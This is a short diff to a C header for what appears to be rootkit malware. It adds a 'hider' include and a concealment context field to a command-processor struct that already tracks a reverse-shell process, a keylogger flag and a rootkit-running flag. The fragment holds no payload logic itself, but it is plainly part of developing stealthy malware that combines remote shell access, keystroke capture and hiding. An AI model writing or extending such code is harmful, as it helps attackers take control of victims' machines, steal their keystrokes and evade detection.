@@ -2,6 +2,7 @@
 #define __COMMAND_PROCESSOR_H
 
 #include <sys/types.h>
+#include "userspace/hider.h"
 
 typedef struct {
     int tracked_pids_map_fd;
@@ -9,6 +10,7 @@ typedef struct {
     pid_t *reverse_shell_pid;
     bool *keylogger_active;
     volatile bool *rootkit_running;
+    hider_context_t *hider_ctx;
 } command_processor_context_t;
 
 /**
